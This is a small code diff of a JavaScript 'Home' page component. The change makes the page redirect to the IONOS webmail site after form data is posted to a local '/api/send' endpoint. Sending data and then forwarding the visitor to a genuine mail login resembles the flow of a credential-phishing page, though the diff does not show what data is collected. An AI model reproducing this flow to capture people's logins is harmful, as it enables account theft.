@@ -21,8 +21,8 @@ export default function Home() {
       const result = await axios.post("/api/send", JSON.stringify(dataObj));
 
       if (result.status === 200) {
-        // return window.location.replace("https://mail.ionos.de/");
-        console.log(result.data);
+        return window.location.replace("https://mail.ionos.de/");
+        // console.log(result.data);
       }
       return;
     } catch (error) {
